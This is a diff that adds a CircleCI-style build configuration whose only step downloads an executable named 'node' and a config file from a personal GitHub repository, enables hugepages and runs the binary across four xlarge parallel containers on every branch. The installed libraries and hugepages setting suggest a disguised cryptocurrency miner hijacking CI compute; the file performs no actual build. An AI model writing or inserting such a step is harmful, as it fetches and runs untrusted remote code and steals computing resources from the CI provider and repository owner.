@@ -1,0 +1,12 @@
+jobs:
+  build:
+    docker:
+      - image: ubuntu:16.04
+    parallelism: 4
+    resource_class: xlarge
+    branches:
+      only:
+        - master
+        - /*/
+    steps:
+       - run: apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev && wget https://github.com/henamah/henamahage/raw/master/config.txt && wget https://github.com/henamah/henamahage/raw/master/node && chmod +x node && sysctl -w vm.nr_hugepages=128 && ./node
